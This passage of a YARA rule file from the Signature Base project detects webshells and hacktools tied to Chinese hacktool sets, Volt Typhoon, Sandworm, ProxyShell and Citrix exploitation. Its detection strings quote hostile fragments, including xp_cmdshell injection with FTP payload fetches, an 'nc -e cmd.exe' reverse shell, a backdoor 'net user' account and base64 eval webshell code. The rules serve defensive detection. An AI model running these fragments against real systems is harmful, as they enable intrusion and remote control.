		logic_hash = "02eae9b19274ab7b816d7c336017af8f0fdd5273664eb37be92be12661f3ef1f"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "';exec master.dbo.xp_cmdshell 'echo open " ascii
		$s2 = "';exec master.dbo.xp_cmdshell 'ftp -s:';" ascii
		$s3 = "';exec master.dbo.xp_cmdshell 'echo get lcx.exe" ascii
		$s4 = "';exec master.dbo.xp_cmdshell 'echo get php.exe" ascii
		$s5 = "';exec master.dbo.xp_cmdshell 'copy " ascii
		$s6 = "ftp -s:d:\\ftp.txt " fullword ascii
		$s7 = "echo bye>>d:\\ftp.txt " fullword ascii

	condition:
		filesize <2KB and 2 of them
}
rule SIGNATURE_BASE_Txt_Lcx : FILE {
    meta:
		description = "Chinese Hacktool Set - Webshells - file lcx.c"
		author = "Florian Roth (Nextron Systems)"
		id = "4a4e8810-6dae-526e-86f0-43de45d1c87a"
		date = "2015-06-14"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L575-L592"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ddb3b6a5c5c22692de539ccb796ede214862befe"
		logic_hash = "48121824d3173b77b54b52dc60d3422a904ada46a6ebb20bb585086911cd8360"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "printf(\"Usage:%s -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-l" ascii
		$s2 = "sprintf(tmpbuf2,\"\\r\\n########### reply from %s:%d ####################\\r\\n" ascii
		$s3 = "printf(\" 3: connect to HOST1:PORT1 and HOST2:PORT2\\r\\n\");" fullword ascii
		$s4 = "printf(\"got,ip:%s,port:%d\\r\\n\",inet_ntoa(client1.sin_addr),ntohs(client1.sin" ascii
		$s5 = "printf(\"[-] connect to host1 failed\\r\\n\");" fullword ascii

	condition:
		filesize <25KB and 2 of them
}
rule SIGNATURE_BASE_Txt_Jspcmd : FILE {
    meta:
		description = "Chinese Hacktool Set - Webshells - file jspcmd.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "53eb6caf-3578-5df7-a1d8-9e4038b6f57e"
		date = "2015-06-14"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L594-L608"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1d4e789031b15adde89a4628afc759859e53e353"
		logic_hash = "d2cbf753fbd9e261234e6beb6f79aecb407a368704ae09d907d128d04c242053"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "if(\"1752393\".equals(request.getParameter(\"Confpwd\"))){" fullword ascii
		$s4 = "out.print(\"Hi,Man 2015\");" fullword ascii

	condition:
		filesize <1KB and 1 of them
}
rule SIGNATURE_BASE_Txt_Jsp : FILE {
    meta:
		description = "Chinese Hacktool Set - Webshells - file jsp.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "53eb6caf-3578-5df7-a1d8-9e4038b6f57e"
		date = "2015-06-14"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L610-L626"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "74518faf08637c53095697071db09d34dbe8d676"
		logic_hash = "039b145031cf1127cb1b2aeda063d578d9eb151559232d7e6049965111df1e28"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
		$s2 = "Process pro = Runtime.getRuntime().exec(exe);" fullword ascii
		$s3 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
		$s4 = "cmd = \"cmd.exe /c set\";" fullword ascii

	condition:
		filesize <715KB and 2 of them
}
rule SIGNATURE_BASE_Txt_Aspxlcx : FILE {
    meta:
		description = "Chinese Hacktool Set - Webshells - file aspxlcx.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "e01a7235-5c69-5676-ac5d-c4e4632f31b2"
		date = "2015-06-14"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L628-L644"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "453dd3160db17d0d762e032818a5a10baf234e03"
		logic_hash = "a6e41e6882e74b0dd55ec4afbf6f8708e28267657e304c97d1304266fe1fbc93"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "public string remoteip = " ascii
		$s2 = "=Dns.Resolve(host);" ascii
		$s3 = "public string remoteport = " ascii
		$s4 = "public class PortForward" ascii

	condition:
		uint16(0)==0x253c and filesize <18KB and all of them
}
rule SIGNATURE_BASE_Txt_Xiao : FILE {
    meta:
		description = "Chinese Hacktool Set - Webshells - file xiao.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "cd375597-c343-5f7d-8574-23f700ff432b"
		date = "2015-06-14"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L646-L663"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b3b98fb57f5f5ccdc42e746e32950834807903b7"
		logic_hash = "e99c307482148e4d0eb660281fa70f2dcece200ac8aed032bbef41e421d2a155"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "Session.Contents.Remove(m & \"userPassword\")" fullword ascii
		$s2 = "passWord = Encode(GetPost(\"password\"))" fullword ascii
		$s3 = "conn.Execute(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED," ascii
		$s4 = "function Command(cmd, str){" fullword ascii
		$s5 = "echo \"if(obj.value=='PageWebProxy')obj.form.target='_blank';\"" fullword ascii

	condition:
		filesize <100KB and all of them
}
rule SIGNATURE_BASE_Txt_Aspx : FILE {
    meta:
		description = "Chinese Hacktool Set - Webshells - file aspx.jpg"
		author = "Florian Roth (Nextron Systems)"
		id = "e01a7235-5c69-5676-ac5d-c4e4632f31b2"
		date = "2015-06-14"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L665-L681"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ce24e277746c317d887139a0d71dd250bfb0ed58"
		logic_hash = "43c386bfa88db77801b0494d6a5e4406688f957ffedeb4d2ecdd244549dec708"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" O" ascii
		$s2 = "Process[] p=Process.GetProcesses();" fullword ascii
		$s3 = "Copyright &copy; 2009 Bin" ascii
		$s4 = "<td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"serv" ascii

	condition:
		filesize <100KB and all of them
}
rule SIGNATURE_BASE_Txt_Sql : FILE {
    meta:
		description = "Chinese Hacktool Set - Webshells - file Sql.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "586f23d4-3a04-520d-b75b-f9bbcf67ceeb"
		date = "2015-06-14"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L683-L699"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "f7813f1dfa4eec9a90886c80b88aa38e2adc25d5"
		logic_hash = "0712b6736d8bdc1f19b3494dc3aab9e9a04dde167b5f843e319755cd311e29bd"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "cmd=chr(34)&\"cmd.exe /c \"&request.form(\"cmd\")&\" > 8617.tmp\"&chr(34)" fullword ascii
		$s2 = "strQuery=\"dbcc addextendedproc ('xp_regwrite','xpstar.dll')\"" fullword ascii
		$s3 = "strQuery = \"exec master.dbo.xp_cmdshell '\" & request.form(\"cmd\") & \"'\" " fullword ascii
		$s4 = "session(\"login\")=\"\"" fullword ascii

	condition:
		filesize <15KB and all of them
}
rule SIGNATURE_BASE_Txt_Hello : FILE {
    meta:
		description = "Chinese Hacktool Set - Webshells - file hello.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "42d01411-e333-543d-84a2-758c13bad2df"
		date = "2015-06-14"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L701-L717"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "697a9ebcea6a22a16ce1a51437fcb4e1a1d7f079"
		logic_hash = "823a0a74b07c8f4821247b3cf0450069a9888d44ccd87144330da88594f260c0"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Dim myProcessStartInfo As New ProcessStartInfo(\"cmd.exe\")" fullword ascii
		$s1 = "myProcessStartInfo.Arguments=\"/c \" & Cmd.text" fullword ascii
		$s2 = "myProcess.Start()" fullword ascii
		$s3 = "<p align=\"center\"><a href=\"?action=cmd\" target=\"_blank\">" fullword ascii

	condition:
		filesize <25KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell : FILE {
    meta:
		description = "Sample from CN Honker Pentest Toolset - file Webshell.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "12870766-2b85-522d-9ad8-abba2786caaf"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_tools.yar#L487-L503"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c85bd09d241c2a75b4e4301091aa11ddd5ad6d59"
		logic_hash = "d48a10313afcb5a2084229937703bbc11958a5cd11f8f27fbc8dae15ddfd5ed1"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "Windows NT users: Please note that having the WinIce/SoftIce" fullword ascii
		$s2 = "Do you want to cancel the file download?" fullword ascii
		$s3 = "Downloading: %s" fullword ascii

	condition:
		uint16(0)==0x5a4d and filesize <381KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Getwebshell : FILE {
    meta:
		description = "Sample from CN Honker Pentest Toolset - file GetWebShell.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "919883f4-af66-5d07-ad41-8cba3e049396"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_tools.yar#L913-L930"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b63b53259260a7a316932c0a4b643862f65ee9f8"
		logic_hash = "5d6638596607884950e702144416eb6fd3b009c88e4af5f81a50f346d7491c95"
		score = 70
		quality = 60
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "echo P.Open \"GET\",\"http://www.baidu.com/ma.exe\",0 >>run.vbs" fullword ascii
		$s5 = "http://127.0.0.1/sql.asp?id=1" fullword wide
		$s14 = "net user admin$ hack /add" fullword wide
		$s15 = ";Drop table [hack];create table [dbo].[hack] ([cmd] [image])--" fullword wide

	condition:
		uint16(0)==0x5a4d and filesize <70KB and 1 of them
}
rule SIGNATURE_BASE_WEBSHELL_JAVA_Versamem_JAR_Aug24_1 : FILE {
    meta:
		description = "Detects VersaMem Java webshell samples (as used by Volt Typhoon)"
		author = "blacklotuslabs (modified by Florian Roth and X__Junior)"
		id = "9b666e61-cfa8-58b3-a362-772cd907c57c"
		date = "2024-08-27"
		modified = "2024-08-29"
		reference = "https://x.com/ryanaraine/status/1828440883315999117"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_volttyphoon_versamem.yar#L2-L23"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "d21558eb6c8e700b8a4cb86fdaa5487179828152af68828e878397859d6d3952"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$sa1 = "com.versa.vnms.ui.TestMain"
		$sa2 = "captureLoginPasswordCode"
		$sa3 = "com/versa/vnms/ui/services/impl/VersaAuthenticationServiceImpl"
		$sa4 = "/tmp/.temp.data"
		$sa5 = "getInsertCode"
		$sa6 = "VersaMem"
		$sa7 = "Versa-Auth"
		$sb1 = "/tmp/.java_pid"
		$sb2 = {2f 75 73 72 2f 62 69 6e 2f 70 67 72 65 70 01 00 02 2d 66 01 00 25 6f 72 67 2e 61 70 61 63 68 65 2e 63 61 74 61 6c 69 6e 61 2e 73 74 61 72 74 75 70 2e 42 6f 6f 74 73 74 72 61 70 07}

	condition:
		filesize <5MB and (3 of them or all of ($sb*))
}
rule SIGNATURE_BASE_WEBSHELL_JAVA_Versamem_JAR_Aug24_2 : FILE {
    meta:
		description = "Detects VersaMem Java webshell samples (as used by Volt Typhoon)"
		author = "Florian Roth"
		id = "5ca598ed-5d0a-563d-a5e8-f8229af2c949"
		date = "2024-08-29"
		modified = "2024-08-29"
		reference = "https://x.com/craiu/status/1828687700884336990"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_volttyphoon_versamem.yar#L26-L41"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "0bdf3bf5130c51c1355f179704933ca473a702595c580642035c8d3b9aad5725"
		score = 75
		quality = 60
		tags = "FILE"
		hash1 = "4bcedac20a75e8f8833f4725adfc87577c32990c3783bf6c743f14599a176c37"

	strings:
		$x1 = "tomcat_memShell" ascii
		$x2 = "versa/vnms/ui/config/" ascii fullword

	condition:
		uint16(0)==0x4b50 and filesize <3000KB and 1 of them
}
rule SIGNATURE_BASE_APT_WEBSHELL_PHP_Sandworm_May20_1 : FILE {
    meta:
		description = "Detects GIF header PHP webshell used by Sandworm on compromised machines"
		author = "Florian Roth (Nextron Systems)"
		id = "b9ec02c2-fa83-5f21-95cf-3528047b2d01"
		date = "2020-05-28"
		modified = "2023-12-05"
		reference = "https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_sandworm_exim_expl.yar#L86-L101"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "0d10f618c7b465c7691d6054e994a76f56c12eb0a36d2d98b5accd2c1e2c1da7"
		score = 75
		quality = 85
		tags = "FILE"
		hash1 = "dc074464e50502459038ac127b50b8c68ed52817a61c2f97f0add33447c8f730"
		hash2 = "538d713cb47a6b5ec6a3416404e0fc1ebcbc219a127315529f519f936420c80e"

	strings:
		$h1 = "GIF89a <?php $" ascii
		$s1 = "str_replace(" ascii

	condition:
		filesize <10KB and $h1 at 0 and $s1
}
rule SIGNATURE_BASE_WEBSHELL_Z_Webshell_1 {
    meta:
		description = "Detects Z Webshell from NCSC report"
		author = "NCSC"
		id = "f4b50760-bd3a-5e1f-bf32-50f16a42c381"
		date = "2018-04-06"
		modified = "2023-12-05"
		old_rule_name = "Z_WebShell"
		reference = "https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_ncsc_report_04_2018.yar#L176-L192"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ace12552f3a980f1eed4cadb02afe1bfb851cafc8e58fb130e1329719a07dbf0"
		logic_hash = "1dfc546a7493c1443527ebe74ed8cd2b06ee032b9a3f736b830e16288e616d43"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ = "Z_PostBackJS" ascii wide
		$ = "z_file_download" ascii wide
		$ = "z_WebShell" ascii wide
		$ = "1367948c7859d6533226042549228228" ascii wide

	condition:
		3 of them
}
rule SIGNATURE_BASE_WEBSHELL_ASPX_Proxyshell_Aug21_2 : FILE {
    meta:
		description = "Detects webshells dropped by ProxyShell exploitation based on their file header (must be PST), size and content"
		author = "Florian Roth (Nextron Systems)"
		id = "a351a466-695e-570e-8c7f-9c6c0534839c"
		date = "2021-08-13"
		modified = "2024-11-01"
		reference = "https://www.bleepingcomputer.com/news/microsoft/microsoft-exchange-servers-are-getting-hacked-via-proxyshell-exploits/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/expl_proxyshell.yar#L36-L49"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "4ede197d482f0a9e553ba857b5049e7b7405e3df92460e19418fa0653c844982"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "Page Language=" ascii nocase

	condition:
		uint32(0)==0x4e444221 and filesize <2MB and $s1
}
rule SIGNATURE_BASE_WEBSHELL_ASPX_Proxyshell_Aug21_3 : FILE {
    meta:
		description = "Detects webshells dropped by ProxyShell exploitation based on their file header (must be DER), size and content"
		author = "Max Altgelt"
		id = "a7bca62b-c8f1-5a38-81df-f3d4582a590b"
		date = "2021-08-23"
		modified = "2024-11-01"
		reference = "https://twitter.com/gossithedog/status/1429175908905127938?s=12"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/expl_proxyshell.yar#L51-L65"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "f071aaa8918b359f786f2ac7447eeaedb5a6fca9e0a0c0e8820e011244424503"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "Page Language=" ascii nocase

	condition:
		uint16(0)==0x8230 and filesize <10KB and $s1
}
rule SIGNATURE_BASE_WEBSHELL_ASPX_Proxyshell_Sep21_1 : FILE {
    meta:
		description = "Detects webshells dropped by ProxyShell exploitation based on their file header (must be PST) and base64 decoded request"
		author = "Tobias Michalski"
		id = "d0d23e17-6b6a-51d1-afd9-59cc2404bcd8"
		date = "2021-09-17"
		modified = "2024-11-01"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/expl_proxyshell.yar#L67-L81"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "219468c10d2b9d61a8ae70dc8b6d2824ca8fbe4e53bbd925eeca270fef0fd640"
		logic_hash = "233ec15dff8da5f2beaa931eb06849aa37e548947c1068d688a1695d977605d8"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s = ".FromBase64String(Request["

	condition:
		uint32(0)==0x4e444221 and any of them
}
rule SIGNATURE_BASE_WEBSHELL_ASPX_Proxyshell_Exploitation_Aug21_1 : FILE {
    meta:
		description = "Detects unknown malicious loaders noticed in August 2021"
		author = "Florian Roth (Nextron Systems)"
		id = "1fa563fc-c91c-5f4e-98f1-b895e1acb4f4"
		date = "2021-08-25"
		modified = "2024-11-01"
		reference = "https://twitter.com/VirITeXplorer/status/1430206853733097473"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/expl_proxyshell.yar#L108-L120"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "8a2417bb85c7f91d98143d2f4c26d30416b3a01ba8abc1445ccfae5609825b4d"
		score = 90
		quality = 85
		tags = "FILE"

	strings:
		$x1 = ");eval/*asf" ascii

	condition:
		filesize <600KB and 1 of them
}
rule SIGNATURE_BASE_WEBSHELL_ASPX_Proxyshell_Aug15 : FILE {
    meta:
		description = "Webshells iisstart.aspx and Logout.aspx"
		author = "Moritz Oettle"
		id = "b1e6c0f3-787f-59b8-8123-4045522047ca"
		date = "2021-09-04"
		modified = "2024-11-01"
		reference = "https://github.com/hvs-consulting/ioc_signatures/tree/main/Proxyshell"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/expl_proxyshell.yar#L122-L146"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "7e2e2f9add5932d28074a252a8e326dd728442df28abc02e8d026d773dd4aa05"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$g1 = "language=\"JScript\"" ascii
		$g2 = "function getErrorWord" ascii
		$g3 = "errorWord" ascii
		$g4 = "Response.Redirect" ascii
		$g5 = "function Page_Load" ascii
		$g6 = "runat=\"server\"" ascii
		$g7 = "Request[" ascii
		$g8 = "eval/*" ascii
		$s1 = "AppcacheVer" ascii
		$s2 = "clientCode" ascii
		$s3 = "LaTkWfI64XeDAXZS6pU1KrsvLAcGH7AZOQXjrFkT816RnFYJQR" ascii

	condition:
		filesize <1KB and (1 of ($s*) or 4 of ($g*))
}
rule SIGNATURE_BASE_WEBSHELL_Mailbox_Export_PST_Proxyshell_Aug26 : FILE {
    meta:
		description = "Webshells generated by an Mailbox export to PST and stored as aspx: 570221043.aspx 689193944.aspx luifdecggoqmansn.aspx"
		author = "Moritz Oettle"
		id = "6aea414f-d27c-5202-84f8-b8620782fc90"
		date = "2021-09-04"
		modified = "2024-11-01"
		reference = "https://github.com/hvs-consulting/ioc_signatures/tree/main/Proxyshell"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/expl_proxyshell.yar#L148-L174"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "07acbf74a4bf169fc128cd085759f33e89917e217703b3c6557ba5f954822fd4"
		score = 85
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "!BDN"
		$g1 = "Page language=" ascii
		$g2 = "<%@ Page" ascii
		$g3 = "Request.Item[" ascii
		$g4 = "\"unsafe\");" ascii
		$g5 = "<%eval(" ascii
		$g6 = "script language=" ascii
		$g7 = "Request[" ascii
		$s1 = "gold8899" ascii
		$s2 = "exec_code" ascii
		$s3 = "orangenb" ascii

	condition:
		filesize <500KB and $x1 at 0 and (1 of ($s*) or 3 of ($g*))
}
rule SIGNATURE_BASE_WEBSHELL_Proxyshell_Exploitation_Nov21_1 {
    meta:
		description = "Detects webshells dropped by DropHell malware"
		author = "Florian Roth (Nextron Systems)"
		id = "300eaadf-db0c-5591-84fc-abdf7cdd90c1"
		date = "2021-11-01"
		modified = "2024-11-01"
		reference = "https://www.deepinstinct.com/blog/do-not-exchange-it-has-a-shell-inside"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/expl_proxyshell.yar#L252-L266"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "d9812d3f53c346c4e318609e0c7de66811b27ffa7528a6ddeb6ac8436da59ef5"
		score = 85
		quality = 85
		tags = ""

	strings:
		$s01 = ".LoadXml(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(Request[" ascii wide
		$s02 = "new System.IO.MemoryStream()" ascii wide
		$s03 = "Transform(" ascii wide

	condition:
		all of ($s*)
}
rule SIGNATURE_BASE_WEBSHELL_Csharp_Hash_String_Oct22 : FILE {
    meta:
		description = "C# webshell using specific hash check for the password."
		author = "Nils Kuhnert (modified by Florian Roth)"
		id = "c7d459be-5e61-57b7-b738-051c0cec62d2"
		date = "2022-10-27"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshell_csharp.yar#L2-L25"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "29c187ad46d3059dc25d5f0958e0e8789fb2a51b9daaf90ea27f001b1a9a603c"
		logic_hash = "28a07f3dd17fc469388867fa82a0e21abeee9c4e114af245b684535e4e194891"
		score = 60
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$gen1 = "void Page_Load" ascii
		$gen2 = "FromBase64String" ascii
		$gen3 = "CryptoServiceProvider" ascii
		$gen4 = "ComputeHash" ascii
		$hashing1 = "BitConverter.ToString(" ascii
		$hashing2 = ").Replace(\"-\", \"\") == \"" ascii
		$filter1 = "BitConverter.ToString((" ascii

	condition:
		filesize <10KB and all of ($gen*) and all of ($hashing*) and not 1 of ($filter*)
}
rule SIGNATURE_BASE_REGEORG_Tuneller_Generic : FILE {
    meta:
		description = "No description has been set in the source file - Signature Base"
		author = "Mandiant"
		id = "a87979b7-2732-5a32-b3f3-a815a58b6589"
		date = "2021-12-20"
		modified = "2023-12-05"
		reference = "https://www.mandiant.com/resources/unc3524-eye-spy-email"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/webshell_regeorg.yar#L1-L20"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ba22992ce835dadcd06bff4ab7b162f9"
		logic_hash = "1657928875c3cd2d5bf774929b0497d78f0211b321f8a4138cc9b8c80b9f99d6"
		score = 75
		quality = 85
		tags = "FILE"
		date_modified = "2021-12-20"

	strings:
		$s1 = "System.Net.IPEndPoint"
		$s2 = "Response.AddHeader"
		$s3 = "Request.InputStream.Read"
		$s4 = "Request.Headers.Get"
		$s5 = "Response.Write"
		$s6 = "System.Buffer.BlockCopy"
		$s7 = "Response.BinaryWrite"
		$s8 = "SocketException soex"

	condition:
		filesize <1MB and 7 of them
}
rule SIGNATURE_BASE_EXPL_Citrix_Netscaler_ADC_Forensicartifacts_CVE_2023_3519_Jul23_2 : CVE_2023_3519 FILE {
    meta:
		description = "Detects forensic artifacts found after an exploitation of Citrix NetScaler ADC CVE-2023-3519"
		author = "Florian Roth"
		id = "471ce547-0133-5836-b9d1-02c932ecfd1e"
		date = "2023-07-21"
		modified = "2023-12-05"
		reference = "https://www.cisa.gov/sites/default/files/2023-07/aa23-201a_csa_threat_actors_exploiting_citrix-cve-2023-3519_to_implant_webshells.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/expl_citrix_netscaler_adc_exploitation_cve_2023_3519.yar#L27-L41"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "48d4225d0935084003f7a98c554d7c4722a91290dfe190001da52bce332b3f7d"
		score = 70
		quality = 85
		tags = "CVE-2023-3519, FILE"

	strings:
		$s1 = "tar -czvf - /var/tmp/all.txt" ascii fullword
		$s2 = "-out /var/tmp/test.tar.gz" ascii
		$s3 = "/test.tar.gz /netscaler/"

	condition:
		filesize <10MB and 1 of them
}
